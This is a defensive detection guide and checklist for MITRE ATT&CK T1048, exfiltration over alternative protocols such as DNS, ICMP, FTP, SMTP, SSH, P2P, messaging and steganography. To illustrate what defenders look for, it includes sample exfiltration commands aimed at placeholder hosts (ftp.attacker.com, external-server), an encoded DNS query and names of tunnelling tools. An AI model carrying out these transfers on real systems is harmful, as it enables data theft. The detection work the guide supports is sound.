# Exfiltration Over Alternative Protocol: [T1048](https://attack.mitre.org/techniques/T1048/)

## Detection Explanation

Exfiltration Over Alternative Protocol involves adversaries using network protocols other than their primary command and control channel to steal data from compromised networks. This technique enables attackers to bypass security controls focused on standard web traffic, evade data loss prevention (DLP) systems, and use unexpected communication channels to covertly transfer stolen data. Alternative protocols are commonly used during the final exfiltration phase after data has been collected and staged.

Attackers use alternative protocols because they often receive less scrutiny than standard HTTP/HTTPS traffic, may bypass content inspection systems, and can leverage legitimate services that are allowed through firewalls. Common methods include exfiltration over symmetric encrypted non-C2 protocols (T1048.001), exfiltration over asymmetric encrypted non-C2 protocols (T1048.002), and exfiltration over unencrypted/obfuscated non-C2 protocols (T1048.003). Protocols frequently abused include DNS, FTP, SMTP, ICMP, SSH, custom protocols, and various messaging or file transfer services.

Successful exfiltration over alternative protocols enables attackers to steal sensitive data while avoiding detection by security tools that focus primarily on HTTP/HTTPS traffic or standard C2 communications. This technique is particularly effective when combined with data staging and compression, as attackers can systematically exfiltrate large volumes of data over time using legitimate-appearing network traffic. The impact includes theft of intellectual property, customer data, financial records, credentials, trade secrets, and other sensitive information with reduced likelihood of detection.

Detection requires monitoring for unusual protocol usage, tracking abnormal volumes of traffic on non-standard protocols, identifying data transfers to unexpected destinations, and correlating alternative protocol activity with data staging and collection behaviors. Organizations should establish baselines for legitimate protocol usage and alert on anomalies such as DNS queries with unusual sizes, ICMP traffic from servers, FTP uploads to external sites, SMTP traffic from non-mail servers, or SSH connections to unexpected destinations.

---

## Key Detection Indicators & Areas to Investigate

### Summary of Indicators

1. DNS exfiltration via oversized queries or TXT records (T1048.003)
2. ICMP tunnel creation and data exfiltration (T1048.003)
3. FTP/FTPS uploads to external or unusual destinations (T1048.001)
4. SMTP traffic from non-mail servers or unusual email patterns (T1048.003)
5. SSH/SCP connections to unexpected external hosts (T1048.002)
6. Custom protocol usage on non-standard ports
7. Peer-to-peer (P2P) protocol exfiltration
8. Physical or alternative network path exfiltration
9. Messaging protocol abuse (XMPP, IRC, Telegram)
10. Steganography or covert channel exfiltration

---

### 1. DNS Exfiltration via Oversized Queries or TXT Records

**DNS Logs:**

- Query logs showing unusually long domain names
- High volume of DNS queries from single host
- TXT, NULL, or other unusual record type queries
- Queries to suspicious or newly registered domains
- Base64 or hex-encoded data in subdomain labels

**Sysmon:**

- Event ID 22 (DNS query) - Suspicious DNS query patterns
- Event ID 3 (Network connection) - DNS connections to unusual resolvers
- Key fields: `QueryName`, `QueryResults`, `Image`

**Network Logs:**

- Firewall logs - DNS traffic (UDP/TCP port 53) volume anomalies
- IDS/IPS - DNS tunneling signatures, oversized queries
- Netflow - Excessive DNS query volumes, unusual query patterns
- DNS server logs - Query types, response codes, query lengths

**Focus on:**

- DNS queries exceeding normal length (>63 characters per label, >253 total)
- High frequency of DNS queries from non-DNS infrastructure
- TXT record queries from workstations or servers
- Queries to domains with random-appearing subdomains
- DNS traffic to external or unauthorized DNS servers

**Suspicious indicators:**

- DNS queries with subdomain lengths >50 characters containing base64 or hex patterns
- Query volume from single host exceeding 1000 queries per hour
- TXT, NULL, CNAME, or MX record queries from non-infrastructure systems
- Queries containing data patterns: `MTIzNDU2Nzg5MA==.attacker.com` (base64 encoded)
- Sequential DNS queries with incrementing identifiers: `data1.`, `data2.`, `data3.`
- Queries to newly registered domains or domains with poor reputation
- DNS queries from web servers, database servers, or workstations (not DNS clients)
- Subdomains with entropy suggesting encoded data rather than legitimate names
- DNS responses with unusually large TXT records (>512 bytes)
- DNS traffic bypassing corporate DNS servers (direct to external resolvers)

---

### 2. ICMP Tunnel Creation and Data Exfiltration

**Windows Event Logs (Security):**

- Event ID 5156 (Windows Filtering Platform connection) - ICMP connections allowed
- Event ID 5157 (Windows Filtering Platform blocked) - ICMP connection attempts

**Sysmon:**

- Event ID 3 (Network connection) - ICMP protocol usage
- Event ID 1 (Process creation) - ICMP tunnel tools execution
- Key fields: `Protocol` (set to ICMP), `SourceIp`, `DestinationIp`

**Network Logs:**

- Firewall logs - ICMP traffic (protocol 1) from non-infrastructure systems
- IDS/IPS - ICMP tunneling signatures (oversized payloads, unusual patterns)
- Packet captures - ICMP payload analysis for data patterns
- Netflow - ICMP traffic volume and session duration

**Common ICMP Tunnel Tools:**

- `ptunnel`, `icmpsh`, `icmptunnel`
- `pingtunnel`, `Hans`, `ICMP-Shell`

**Focus on:**

- ICMP traffic from servers or workstations (not network monitoring)
- Oversized ICMP echo requests/replies (>64 bytes payload)
- Persistent ICMP sessions rather than single ping requests
- ICMP traffic to external IP addresses
- Unusual ICMP types (not standard echo request/reply)

**Suspicious indicators:**

- ICMP packets with payloads >100 bytes from workstations or servers
- Persistent ICMP traffic streams (duration >1 minute) from single host
- ICMP echo requests/replies with non-standard data patterns (not repeating characters)
- High volume of ICMP traffic: >100 packets per minute from single source
- ICMP traffic from processes other than `ping.exe` or network monitoring tools
- ICMP packets to external IPs outside of troubleshooting or monitoring contexts
- ICMP type codes other than 8 (echo request) or 0 (echo reply): type 13, 15, 17
- Bidirectional ICMP communication suggesting tunneling rather than testing
- ICMP packets with payloads containing base64, hex, or encrypted-looking data
- Processes executing ICMP tunnel tools: `ptunnel`, `icmpsh`, custom ICMP utilities

---

### 3. FTP/FTPS Uploads to External or Unusual Destinations

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - FTP client execution
- Event ID 5156 (Windows Filtering Platform connection) - FTP connections

**Sysmon:**

- Event ID 1 (Process creation) - FTP client or script execution
- Event ID 3 (Network connection) - Connections to TCP ports 20-21 (FTP), 989-990 (FTPS)
- Event ID 11 (File created) - Files staged before FTP upload

**Network Logs:**

- Firewall logs - FTP/FTPS connections (TCP ports 20, 21, 989, 990)
- Proxy logs - FTP protocol usage, upload operations
- IDS/IPS - FTP command patterns, large file transfers
- FTP server logs - Authentication, file uploads, connection sources

**Command-Line Patterns:**

- `ftp.exe -s:script.txt ftp.attacker.com`
- `curl.exe -T file.zip ftp://external-server/`
- `winscp.com /script=upload.txt`
- PowerShell: `Send-FtpFile -Server external.com -File data.zip`

**Focus on:**

- FTP uploads from non-administrative systems
- FTP connections to external or unknown destinations
- Large file transfers via FTP
- Automated FTP scripts or scheduled FTP operations
- FTP activity during off-hours

**Suspicious indicators:**

- `ftp.exe` executed with `-s` parameter (scripted uploads) from workstations
- FTP connections to external IP addresses or non-corporate FTP servers
- FTP PUT commands uploading files from staging directories: `%TEMP%`, `C:\Users\Public\`
- Large file transfers (>50MB) via FTP to external destinations
- FTP client processes spawned from Office applications, browsers, or script interpreters
- Anonymous FTP uploads or connections using default credentials
- FTP activity from database servers, web servers, or domain controllers
- Multiple files uploaded sequentially via FTP within short timeframe
- FTP connections during off-hours (00:00-06:00) or weekends
- WinSCP, FileZilla, or other FTP clients with automated script parameters

---

### 4. SMTP Traffic from Non-Mail Servers or Unusual Email Patterns

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Email client or SMTP utility execution
- Event ID 5156 (Windows Filtering Platform connection) - SMTP connections

**Sysmon:**

- Event ID 3 (Network connection) - Connections to TCP port 25 (SMTP), 587 (submission), 465 (SMTPS)
- Event ID 1 (Process creation) - SMTP clients or scripts
- Key fields: `DestinationPort`, `DestinationIp`, `Image`

**Network Logs:**

- Firewall logs - SMTP traffic (TCP 25, 587, 465) from non-mail servers
- Mail gateway logs - Email sent from internal hosts to external addresses
- IDS/IPS - SMTP protocol anomalies, large attachments
- Proxy logs - SMTP connections bypassing mail relays

**Email Patterns:**

- Large attachments from non-mail systems
- Emails with generic subjects: "Data", "Backup", "Files"
- Automated emails sent in rapid succession
- Emails to external personal accounts (Gmail, Yahoo, Outlook)
- Base64-encoded content in email bodies

**Focus on:**

- SMTP connections from workstations, servers (not mail servers)
- Direct SMTP connections bypassing corporate mail relay
- Emails with large attachments or unusual content
- Automated email sending scripts
- SMTP traffic during off-hours

**Suspicious indicators:**

- Workstations or application servers making direct SMTP connections (port 25) to external mail servers
- Processes other than legitimate mail clients connecting to SMTP ports
- PowerShell scripts using `Send-MailMessage` or `System.Net.Mail.SmtpClient`
- SMTP connections bypassing corporate mail relay to Gmail, Yahoo, or other external providers
- Emails with large attachments (>10MB) sent from non-mail server systems
- Multiple emails sent within minutes to external personal email accounts
- Email subjects or bodies containing generic terms: "backup", "data export", "files"
- Base64-encoded content in email bodies (encoded files embedded in message)
- SMTP traffic from database servers, file servers, or domain controllers
- Emails sent via command-line tools: `blat.exe`, `sendmail`, or custom scripts

---

### 5. SSH/SCP Connections to Unexpected External Hosts

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - SSH/SCP client execution
- Event ID 5156 (Windows Filtering Platform connection) - SSH connections

**Sysmon:**

- Event ID 1 (Process creation) - SSH clients (PuTTY, OpenSSH, WinSCP, pscp)
- Event ID 3 (Network connection) - Connections to TCP port 22
- Event ID 11 (File created) - SSH keys or configuration files

**Linux/Unix Logs:**

- `/var/log/auth.log` or `/var/log/secure` - SSH client connections
- Bash history - SSH/SCP commands
- `.ssh/known_hosts` - Connection history

**Network Logs:**

- Firewall logs - SSH traffic (TCP port 22) to external destinations
- IDS/IPS - SSH protocol anomalies, tunnel detection
- Netflow - SSH session duration and data volumes

**Command-Line Patterns:**

- `ssh user@external-server.com`
- `scp -r /data/ user@external-server:/backup/`
- `pscp.exe -scp -r C:\Data\ user@external:/tmp/`
- `sftp user@external-server` with batch upload commands

**Focus on:**

- SSH connections to external or non-corporate IP addresses
- SCP/SFTP file transfers to unknown destinations
- SSH from non-administrative systems or users
- Large data transfers over SSH
- SSH connections during off-hours

**Suspicious indicators:**

- SSH connections from workstations to external IP addresses not in corporate infrastructure
- `ssh.exe`, `putty.exe`, `pscp.exe` executed by non-administrative users
- SCP file transfers uploading data from staging directories to external hosts
- SSH connections to newly created cloud instances or VPS providers
- Large outbound data transfers over port 22 (>100MB) from single source
- SSH client processes spawned from script interpreters or Office applications
- SSH connections to IP addresses in high-risk geographic regions
- Multiple SSH connections to different external hosts from same system
- SSH key generation followed immediately by external SSH connection
- SFTP batch uploads: multiple files transferred sequentially over SSH

---

### 6. Custom Protocol Usage on Non-Standard Ports

**Sysmon:**

- Event ID 3 (Network connection) - Connections to unusual ports
- Key fields: `DestinationPort`, `DestinationIp`, `Image`, `Initiated`

**Windows Event Logs (Security):**

- Event ID 5156 (Windows Filtering Platform connection) - Custom port usage
- Event ID 5157 (Windows Filtering Platform blocked) - Blocked non-standard connections

**Network Logs:**

- Firewall logs - Traffic to non-standard ports (>1024, not common services)
- IDS/IPS - Unknown protocol signatures, custom application protocols
- Netflow - Traffic volume on unusual ports
- Packet captures - Protocol analysis of non-standard traffic

**Unusual Ports:**

- High-numbered ports: 8000-9000, 40000-50000
- Ports mimicking common services: 8080 (HTTP-like), 4443 (HTTPS-like)
- Random or uncommon ports: 31337, 12345, 54321

**Focus on:**

- Outbound connections to unusual destination ports
- Custom protocols without legitimate business purpose
- High-volume data transfers on non-standard ports
- Encrypted traffic on unusual ports
- Connections to external IPs on custom ports

**Suspicious indicators:**

- Outbound connections to high-numbered ports (>10000) to external IPs
- Traffic to ports not associated with any legitimate business application
- Large data transfers (>50MB) on non-standard ports
- Encrypted or binary protocol traffic on unusual ports (not HTTPS on 443)
- Connections to ports commonly used by backdoors: 31337, 12345, 4444, 5555
- Persistent connections on custom ports with periodic data exchange
- Multiple systems connecting to same external IP on unusual port
- Custom protocol traffic bypassing proxy or application inspection
- Connections initiated by processes in `%TEMP%`, `%APPDATA%`, or user directories
- Port usage matching known malware C2 ports: Cobalt Strike (50050), Meterpreter (4444)

---

### 7. Peer-to-Peer (P2P) Protocol Exfiltration

**Sysmon:**

- Event ID 3 (Network connection) - P2P protocol connections
- Event ID 1 (Process creation) - P2P client execution

**Network Logs:**

- Firewall logs - P2P protocol signatures, BitTorrent traffic
- IDS/IPS - P2P protocol detection (BitTorrent, eDonkey, Gnutella)
- Netflow - P2P traffic patterns (many connections, distributed hosts)
- DPI (Deep Packet Inspection) - P2P protocol identification

**P2P Protocols:**

- BitTorrent (TCP 6881-6889, various)
- eDonkey/eMule (TCP 4661-4665)
- Gnutella (TCP 6346-6347)
- Direct Connect (TCP 411, 412)
- IPFS (TCP 4001)

**Focus on:**

- P2P client installation or execution on corporate systems
- P2P protocol traffic from servers or sensitive systems
- Seeding or uploading via P2P protocols
- P2P connections to many external peers
- Custom or less common P2P protocols

**Suspicious indicators:**

- BitTorrent client processes: `bittorrent.exe`, `utorrent.exe`, `transmission`
- P2P protocol signatures in network traffic from corporate systems
- High number of simultaneous connections (>50) to distributed external IPs
- Upload traffic via P2P protocols (seeding behavior)
- P2P clients executed from `%TEMP%` or portable/standalone installations
- IPFS daemon or client running on non-development systems
- P2P protocol usage from servers, databases, or domain controllers
- Distributed hash table (DHT) traffic patterns
- Magnet links or torrent file downloads followed by P2P client execution
- P2P traffic during off-hours or from service accounts

---

### 8. Physical or Alternative Network Path Exfiltration

**Windows Event Logs (Security):**

- Event ID 4663 (Access attempted to object) - File writes to removable media
- Event ID 4656 (Handle to object requested) - Removable drive access
- Event ID 6416 (External device recognized) - New device connected

**Windows Event Logs (System):**

- Event ID 7036 (Service state change) - USB storage driver start
- Event ID 20001 (Device installation) - New device installation
- Event ID 10000 (DriverFrameworks-UserMode) - USB device connected

**Sysmon:**

- Event ID 11 (File created) - Files written to removable media
- Event ID 1 (Process creation) - Processes accessing removable drives
- Event ID 23 (File deleted) - File deletion from primary storage after copy

**Registry Keys:**

- USB device history: `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR`
- Mounted devices: `HKLM\SYSTEM\MountedDevices`

**Focus on:**

- Files copied to removable media drives
- Large data transfers to USB drives
- Removable media usage during off-hours
- Files copied then deleted after transfer
- Unauthorized or unregistered device usage

**Suspicious indicators:**

- Event ID 6416 showing USB mass storage device connection during off-hours
- Large files (>100MB) or many files copied to removable drives
- Archives (`.zip`, `.rar`, `.7z`) written to USB drives
- Sensitive directories copied to removable media: `Documents\`, `Database\`
- Files copied to removable drive then deleted from source (Event ID 4663 + Event ID 23)
- USB device connection from systems handling sensitive data
- Removable media usage by accounts that don't typically use such devices
- Multiple files copied to external drive within short timeframe
- USB device serial numbers not registered in asset management
- File transfer to removable media followed by immediate device removal

---

### 9. Messaging Protocol Abuse (XMPP, IRC, Telegram)

**Sysmon:**

- Event ID 3 (Network connection) - Connections to messaging service ports
- Event ID 1 (Process creation) - Messaging client execution
- Event ID 22 (DNS query) - DNS queries to messaging service domains

**Network Logs:**

- Firewall logs - Connections to messaging service IPs/ports
- Proxy logs - Messaging protocol traffic, API calls
- IDS/IPS - XMPP, IRC protocol signatures
- DNS logs - Queries to messaging service domains

**Messaging Protocols/Services:**

- IRC (TCP 6667, 6697)
- XMPP/Jabber (TCP 5222, 5223)
- Telegram (various ports, API endpoints)
- Discord (HTTPS API calls)
- Slack (HTTPS API calls)
- Matrix protocol

**Focus on:**

- Messaging protocol usage from non-user systems
- Automated messaging or bot activity
- File transfers via messaging protocols
- Messaging from servers or infrastructure systems
- Use of messaging APIs for data transmission

**Suspicious indicators:**

- IRC connections (ports 6667, 6697) from servers, workstations, or automated processes
- XMPP protocol traffic from non-communication systems
- Telegram API calls (`api.telegram.org`) from scripts or automated processes
- Discord webhook usage for data exfiltration: `discord.com/api/webhooks/`
- Slack incoming webhooks sending large message payloads or file attachments
- IRC bot commands or automated message patterns
- Messaging client processes spawned from scripts or scheduled tasks
- Base64-encoded data sent via messaging APIs
- High frequency of messaging API calls (>100 per hour) from single source
- File uploads to messaging services from non-user accounts or servers

---

### 10. Steganography or Covert Channel Exfiltration

**Sysmon:**

- Event ID 1 (Process creation) - Steganography tool execution
- Event ID 11 (File created) - Images or media files created/modified
- Event ID 3 (Network connection) - Upload of steganographic carriers

**Windows Event Logs (Security):**

- Event ID 4688 (Process creation) - Image manipulation tools
- Event ID 4663 (Access attempted to object) - Access to image files

**Network Logs:**

- Proxy logs - Image uploads to social media, file sharing
- Firewall logs - Large image/media file transfers
- HTTP traffic analysis - Unusual image upload patterns

**Steganography Tools:**

- `steghide`, `openstego`, `outguess`
- `jphide`, `jpseek`, `stegdetect`
- Custom Python/PowerShell steganography scripts

**Covert Channels:**

- HTTP header manipulation
- Timing-based channels
- Protocol field abuse (IP ID, TCP sequence numbers)
- DNS NULL records
- Image EXIF data

**Focus on:**

- Steganography tool execution
- Large numbers of images created or uploaded
- Image files modified then uploaded to external services
- Unusual patterns in network protocol fields
- Timing patterns suggesting covert communication

**Suspicious indicators:**

- Steganography tools executed: `steghide`, `openstego`, image manipulation scripts
- Large volumes of image files (`.png`, `.jpg`, `.bmp`) created or modified
- Images uploaded to social media or image hosting sites from corporate systems
- PowerShell or Python scripts performing bit-level manipulation of image files
- Image files significantly larger than expected for their resolution
- Sequential image uploads to external services from servers or non-user systems
- HTTP headers with unusual or binary-looking values
- Protocol field anomalies: TCP sequence numbers with patterns, IP ID fields with data
- Timing patterns in network traffic suggesting timing-channel communication
- Images with EXIF data containing base64 or hex-encoded strings
---
# Exfiltration Over Alternative Protocol Investigation Checklist

## 1. DNS Exfiltration

- [ ] Review DNS queries with subdomain lengths >50 characters containing base64/hex patterns
- [ ] Check query volume from single host exceeding 1000 queries per hour
- [ ] Monitor TXT, NULL, CNAME, or MX record queries from non-infrastructure systems
- [ ] Identify sequential queries with incrementing identifiers: data1., data2., data3.
- [ ] Look for queries to newly registered domains or poor reputation domains
- [ ] Check DNS queries from web/database servers (not DNS clients)
- [ ] Review subdomains with high entropy suggesting encoded data
- [ ] Monitor DNS traffic bypassing corporate DNS (direct to external resolvers)

## 2. ICMP Tunnel Exfiltration

- [ ] Check ICMP packets with payloads >100 bytes from workstations/servers
- [ ] Review persistent ICMP traffic streams (duration >1 minute) from single host
- [ ] Monitor ICMP with non-standard data patterns (not repeating characters)
- [ ] Identify high volume: >100 ICMP packets per minute from single source
- [ ] Look for ICMP from processes other than ping.exe or network monitoring
- [ ] Check ICMP to external IPs outside troubleshooting contexts
- [ ] Review ICMP type codes other than 8 (echo request) or 0 (echo reply)
- [ ] Monitor processes executing ICMP tunnel tools: ptunnel, icmpsh

## 3. FTP/FTPS Upload Detection

- [ ] Review ftp.exe with -s parameter (scripted uploads) from workstations
- [ ] Check FTP connections to external IPs or non-corporate FTP servers
- [ ] Monitor FTP PUT commands uploading from %TEMP%, C:\Users\Public\
- [ ] Identify large file transfers (>50MB) via FTP to external destinations
- [ ] Look for FTP from database servers, web servers, domain controllers
- [ ] Check anonymous FTP uploads or connections with default credentials
- [ ] Review multiple files uploaded sequentially via FTP
- [ ] Monitor FTP activity during off-hours (00:00-06:00) or weekends

## 4. SMTP from Non-Mail Servers

- [ ] Check workstations/app servers making direct SMTP connections (port 25) to external mail
- [ ] Review processes other than mail clients connecting to SMTP ports
- [ ] Monitor PowerShell Send-MailMessage or System.Net.Mail.SmtpClient usage
- [ ] Identify SMTP bypassing corporate relay to Gmail, Yahoo, external providers
- [ ] Look for emails with large attachments (>10MB) from non-mail servers
- [ ] Check multiple emails within minutes to external personal accounts
- [ ] Review email subjects: "backup", "data export", "files"
- [ ] Monitor SMTP from database/file/domain controller servers

## 5. SSH/SCP External Connections

- [ ] Review SSH connections from workstations to external IPs not in corporate infrastructure
- [ ] Check ssh.exe, putty.exe, pscp.exe executed by non-administrative users
- [ ] Monitor SCP file transfers uploading from staging directories to external hosts
- [ ] Identify SSH to newly created cloud instances or VPS providers
- [ ] Look for large outbound transfers over port 22 (>100MB) from single source
- [ ] Check SSH from script interpreters or Office applications
- [ ] Review SSH to IPs in high-risk geographic regions
- [ ] Monitor SSH key generation followed by immediate external connection

## 6. Custom Protocol Usage

- [ ] Check outbound connections to high-numbered ports (>10000) to external IPs
- [ ] Review traffic to ports not associated with legitimate business applications
- [ ] Monitor large transfers (>50MB) on non-standard ports
- [ ] Identify connections to backdoor ports: 31337, 12345, 4444, 5555
- [ ] Look for persistent connections on custom ports with periodic data exchange
- [ ] Check multiple systems connecting to same external IP on unusual port
- [ ] Review connections from %TEMP%, %APPDATA%, user directories
- [ ] Monitor port usage matching malware C2: Cobalt Strike (50050), Meterpreter (4444)

## 7. P2P Protocol Exfiltration

- [ ] Review BitTorrent client processes: bittorrent.exe, utorrent.exe, transmission
- [ ] Check P2P protocol signatures in traffic from corporate systems
- [ ] Monitor high simultaneous connections (>50) to distributed external IPs
- [ ] Identify upload traffic via P2P protocols (seeding behavior)
- [ ] Look for P2P clients executed from %TEMP% or portable installations
- [ ] Check IPFS daemon or client on non-development systems
- [ ] Review P2P from servers, databases, domain controllers
- [ ] Monitor P2P traffic during off-hours or from service accounts

## 8. Physical/Removable Media Exfiltration

- [ ] Review Event ID 6416 for USB mass storage during off-hours
- [ ] Check large files (>100MB) or many files copied to removable drives
- [ ] Monitor archives (.zip, .rar, .7z) written to USB drives
- [ ] Identify sensitive directories copied: Documents, Database\
- [ ] Look for files copied to USB then deleted from source
- [ ] Check USB usage by accounts that don't typically use devices
- [ ] Review multiple file copies to external drive within short timeframe
- [ ] Monitor USB serial numbers not registered in asset management

## 9. Messaging Protocol Abuse

- [ ] Check IRC connections (ports 6667, 6697) from servers/workstations
- [ ] Review XMPP protocol traffic from non-communication systems
- [ ] Monitor Telegram API calls (api.telegram.org) from scripts/automated processes
- [ ] Identify Discord webhooks for data exfiltration: discord.com/api/webhooks/
- [ ] Look for Slack webhooks sending large payloads or file attachments
- [ ] Check IRC bot commands or automated message patterns
- [ ] Review messaging clients spawned from scripts or scheduled tasks
- [ ] Monitor high frequency API calls (>100/hour) from single source

## 10. Steganography and Covert Channels

- [ ] Review steganography tools executed: steghide, openstego, image scripts
- [ ] Check large volumes of images (.png, .jpg, .bmp) created or modified
- [ ] Monitor images uploaded to social media/image hosting from corporate systems
- [ ] Identify PowerShell/Python performing bit-level image manipulation
- [ ] Look for images significantly larger than expected for resolution
- [ ] Check sequential image uploads from servers or non-user systems
- [ ] Review HTTP headers with unusual or binary-looking values
- [ ] Monitor protocol field anomalies: TCP sequence numbers, IP ID with data patterns